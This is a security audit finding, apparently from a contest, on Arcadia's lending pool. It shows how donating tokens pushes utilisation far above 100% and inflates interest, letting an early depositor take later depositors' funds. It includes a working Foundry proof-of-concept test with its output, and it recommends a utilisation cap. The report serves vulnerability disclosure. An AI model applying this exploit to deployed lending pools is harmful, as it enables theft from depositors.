Bent Misty Sardine

high

# Utilisation Can Be Manipulated Far Above 100%

## Summary

The utilisation of the protocol can be manipulated far above 100% via token donation. It is easiest to set this up on an empty pool. This can be used to manipulate the interest to above 10000% per minute to steal from future depositors.

## Vulnerability Detail

This attack is inspired by / taken from this bug report for Silo Finance. I recommend reading it as is very well written: https://medium.com/immunefi/silo-finance-logic-error-bugfix-review-35de29bd934a

The utilisation is basically _assets_borrowed / assets_loaned_. A higher utilisation creates a higher interest rate. This is assumed to be less than 100%. However if it exceeds 100%, there is no cap here:

https://github.com/sherlock-audit/2023-12-arcadia/blob/main/lending-v2/src/LendingPool.sol#L809-L817

Normally, assets borrowed should never exceed assets loaned, however this is possible in Arcadia as the only thing stopping a borrow exceeding loans is that the `transfer` of tokens will revert due to not enough tokens in the `Lending pool`. However, an attacker can make it not revert by simply sending tokens directly into the lending pool. For example using the following sequence:

1. deposit 100 assets into tranche
2. Use ERC20 Transfer to transfer `1e18` assets into the `LendingPool`
3. Borrow the `1e18` assets

These are the first steps of the coded POC at the bottom of this issue. It uses a token donation to make a borrow which is far larger than the loan amount. 

In the utilisation calculation, this results in a incredibly high utilisation rate  and thus interest rate as it is not capped at 100%. This is why some protocols implement a hardcap of utilisation at 100%.

The interest rate is so high that over 2 minutes, 100 assets grows to over100000 assets, or a 100000% interest over 2 minutes. The linked similar exploit on Silo Finance has an even more drastic interest manipulation which could drain the whole protocol in a block. However I did not optimise the numbers for this POC.

Note that the 1e18 assets "donated" to the protocol are not lost. They can simply be all borrowed into an attackers account.

The attacker can set this up when the initial lending pool is empty. Then, they can steal assets from subsequent depositors due to the huge amount of interest collected from their small initial deposit

Let me sum up the attack in the POC:

1. deposit 100 assets into tranche
2. Use ERC20 Transfer to transfer `1e18` assets into the `LendingPool`
3. Borrow the `1e18` assets
4. Victim deposits into tranche
5. Attacker withdraws the victims funds which is greater than the 100 assets the attacker initially deposited

Here is the output from the console.logs:

```bash
Running 1 test for test/scenario/BorrowAndRepay.scenario.t.sol:BorrowAndRepay_Scenario_Test
[PASS] testScenario_Poc() (gas: 799155)
Logs:
  100 initial pool balance. This is also the amount deposited into tranche
  warp 2 minutes into future
  mint was used rather than deposit to ensure no rounding error. This a UTILISATION manipulation attack not a share inflation attack
  22 shares were burned in exchange for 100000 assets. Users.LiquidityProvider only deposited 100 asset in the tranche but withdrew 100000 assets!

```

This is the edited version of `setUp()` in `_scenario.t.sol`

```solidity
function setUp() public virtual override(Fuzz_Lending_Test) {
        Fuzz_Lending_Test.setUp();
        deployArcadiaLendingWithAccounts();

        vm.prank(users.creatorAddress);
        pool.addTranche(address(tranche), 50);

        // Deposit funds in the pool.
        deal(address(mockERC20.stable1), users.liquidityProvider, type(uint128).max, true);

        vm.startPrank(users.liquidityProvider);
        mockERC20.stable1.approve(address(pool), 100);
        //only 1 asset was minted to the liquidity provider
        tranche.mint(100, users.liquidityProvider);
        vm.stopPrank();

        vm.startPrank(users.creatorAddress);
        pool.setAccountVersion(1, true);
        pool.setInterestParameters(
            Constants.interestRate, Constants.interestRate, Constants.interestRate, Constants.utilisationThreshold
        );
        vm.stopPrank();

        vm.prank(users.accountOwner);
        proxyAccount.openMarginAccount(address(pool));
    }
```

This test was added to `BorrowAndRepay.scenario.t.sol`

```solidity
    function testScenario_Poc() public {

        uint poolBalance = mockERC20.stable1.balanceOf(address(pool));
        console.log(poolBalance, "initial pool balance. This is also the amount deposited into tranche");
        vm.startPrank(users.liquidityProvider);
        mockERC20.stable1.approve(address(pool), 1e18);
        mockERC20.stable1.transfer(address(pool),1e18);
        vm.stopPrank();

        // Given: collateralValue is smaller than maxExposure.
        //amount token up to max
        uint112 amountToken = 1e30;
        uint128 amountCredit = 1e10;

        //get the collateral factor
        uint16 collFactor_ = Constants.tokenToStableCollFactor;
        uint256 valueOfOneToken = (Constants.WAD * rates.token1ToUsd) / 10 ** Constants.tokenOracleDecimals;

        //deposits token1 into proxyAccount
        depositTokenInAccount(proxyAccount, mockERC20.token1, amountToken);

        uint256 maxCredit = (
            //amount credit is capped based on amount Token
            (valueOfOneToken * amountToken) / 10 ** Constants.tokenDecimals * collFactor_ / AssetValuationLib.ONE_4
                / 10 ** (18 - Constants.stableDecimals)
        );


        vm.startPrank(users.accountOwner);
        //borrow the amountCredit to the proxy account
        pool.borrow(amountCredit, address(proxyAccount), users.accountOwner, emptyBytes3);
        vm.stopPrank();

        assertEq(mockERC20.stable1.balanceOf(users.accountOwner), amountCredit);

        //warp 2 minutes into the future.
        vm.roll(block.number + 10);
        vm.warp(block.timestamp + 120);

        console.log("warp 2 minutes into future");

        address victim = address(123);
        deal(address(mockERC20.stable1), victim, type(uint128).max, true);

        vm.startPrank(victim);
        mockERC20.stable1.approve(address(pool), type(uint128).max);
        uint shares = tranche.mint(1e3, victim);
        vm.stopPrank();

        console.log("mint was used rather than deposit to ensure no rounding error. This a UTILISATION manipulation attack not a share inflation attack");

        //function withdraw(uint256 assets, address receiver, address owner_)

        //WITHDRAWN 1e5
        vm.startPrank(users.liquidityProvider);
        uint withdrawShares = tranche.withdraw(1e5, users.liquidityProvider,users.liquidityProvider);
        vm.stopPrank();

        console.log(withdrawShares, "shares were burned in exchange for 100000 assets. Users.LiquidityProvider only deposited 100 asset in the tranche but withdrew 100000 assets!");


    }
```

## Impact

An early depositor can steal funds from future depositors through utilisation/interest rate manipulation.

## Code Snippet

https://github.com/sherlock-audit/2023-12-arcadia/blob/main/lending-v2/src/LendingPool.sol#L809-L817

## Tool used

Manual Review

## Recommendation

Add a utilisation cap of 100%. Many other lending protocols implement this mitigation.
